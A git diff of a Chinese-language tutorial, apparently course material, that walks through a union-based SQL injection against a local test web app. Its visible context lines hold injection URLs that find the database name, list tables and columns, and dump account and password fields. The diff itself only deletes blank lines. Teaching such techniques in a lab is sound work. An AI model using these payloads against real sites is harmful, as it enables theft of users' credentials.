@@ -60,7 +60,6 @@ http://localhost:3030/article?id=3 and 1=1 union select 1,2,3,4,5
 <div align="center">
 <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second4.png?dir=0&filepath=second%2Fimages%2Fsecond4.png&oid=d309dcd588b2739a221d708d02b1467cd4250b1e&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5" width = "500" height = "auto" alt="图片名称" align=center />
 </div> 
-
 因为union两头连接的表的字段数不一样，所以后台处理会发生错误，总之返回肯定会不正常，有的可能还会显示DEBUG信息= - =
 最后第五步成功，我们放到mysql里面执行就是如下结果：
 <div align="center">
@@ -98,7 +97,6 @@ http://localhost:3030/article?id=3 and 1=1 union select 10000,version(),database
 <div align="center">
 <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second9.png?dir=0&filepath=second%2Fimages%2Fsecond9.png&oid=26239ee0a623bd228a1a6a15c759a548bca886bc&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5" width = "500" height = "auto" alt="图片名称" align=center />
 </div> 
-
 这很棒哦。现在我们要记住virustest这个数据库的名称，在下面有用处
 
 - 第四步，得到这个数据库里面所有的表的名称：
@@ -110,7 +108,6 @@ order by rand()是为了能够查看到所有的表名，我们多执行几次�
 <div align="center">
 <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second10.png?dir=0&filepath=second%2Fimages%2Fsecond10.png&oid=7c04e1e47934c7e01b17781ad2307ac931a1a142&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5" width = "500" height = "auto" alt="图片名称" align=center />
 </div> 
-
 这个表就有意思了，我们来继续注入，尝试着拿到用户名和密码
 
 - 第五步，拖出数据库内Users表的表段名称
@@ -122,11 +119,9 @@ http://localhost:3030/article?id=3 and 1=1 union SELECT 10000,COLUMN_NAME,3,4,5 
 <div align="center">
 <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second11.png?dir=0&filepath=second%2Fimages%2Fsecond11.png&oid=1a11580e22b0021646f3c07763243f47e49e54d3&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5" width = "500" height = "auto" alt="图片名称" align=center />
 </div> 
-
 <div align="center">
 <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second12.png?dir=0&filepath=second%2Fimages%2Fsecond12.png&oid=b733f21a45c93c0685bb719fb0bde8a8bdc654dd&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5" width = "500" height = "auto" alt="图片名称" align=center />
 </div> 
-
 记下account和password字段名称，我们开始拖出数据
 
 - 第六步，拖出数据库内的数据
@@ -138,7 +133,6 @@ http://localhost:3030/article?id=3 and 1=1 union select 1,account,password,4,5 f
 <div align="center">
 <img src="http://git.oschina.net/mrbian/ComputerVirus/raw/master/second/images/second13.png?dir=0&filepath=second%2Fimages%2Fsecond13.png&oid=8f989ffb55ff784f929f253faf7bd03c8c1da711&sha=ca6c943f09be7b21a326ac9e4b2720d8cd6094d5" width = "500" height = "auto" alt="图片名称" align=center />
 </div> 
-
 不断F5刷新，就可以看到所有的account和password
 
 ### 简单的注入分析
